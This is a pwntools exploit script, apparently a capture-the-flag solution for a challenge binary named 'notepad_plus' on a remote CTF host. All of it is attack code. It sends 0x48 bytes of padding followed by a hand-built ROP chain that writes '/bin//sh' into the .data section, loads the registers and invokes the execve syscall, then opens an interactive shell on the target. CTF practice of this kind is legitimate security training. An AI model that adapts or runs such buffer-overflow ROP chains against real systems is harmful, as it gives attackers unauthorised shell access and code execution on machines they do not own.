from pwn import *
import struct

local = False
elf = 'notepad_plus' 

if local: 
    print('./'+elf)
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "ctf.adl.tw"
    port = 11004
    r = remote(ip,port)

context.arch = 'amd64'
context.os= 'linux'

print(r.recvuntil(': '))
payload = b'a'*0x48
payload += p64(0x4124d3)            # pop rsi; ret
payload += p64(0x68732f2f6e69622f)  # "/bin//sh"
payload += p64(0x40283c)            # pop rdi ; pop rbp ; ret
payload += p64(0x6b90e0)            # @ .data (0x6b90e0)
payload += p64(0x0)                 # noise
payload += p64(0x44a48b)            # mov qword ptr [rdi], rsi ; ret
payload += p64(0x443ab5)            # xor rax, rax ; ret
payload += p64(0x418586)            # mov qword ptr [rdi+8], rax; ret
payload += p64(0x44f2a9)            # pop rdx ; pop rsi ; ret 
payload += p64(0x0)                 # noise
payload += p64(0x6b90e8)            # @ .data+8 (0x6b90e8)
payload += p64(0x44cccc)            # pop rax ; ret
payload += p64(0x3b)                # 59 (execve)
payload += p64(0x44f284)            # pop rdx ; pop r10 ; ret
payload += p64(0x6b90e8)            # @ .data+8 (0x6b90e8)
payload += p64(0x0)                 # noise
payload += p64(0x47b6af)            # syscall
print(payload)
print(len(payload))
r.sendline(payload)
print(r.recvuntil('note.\n'))
print(r.recv())
r.interactive()
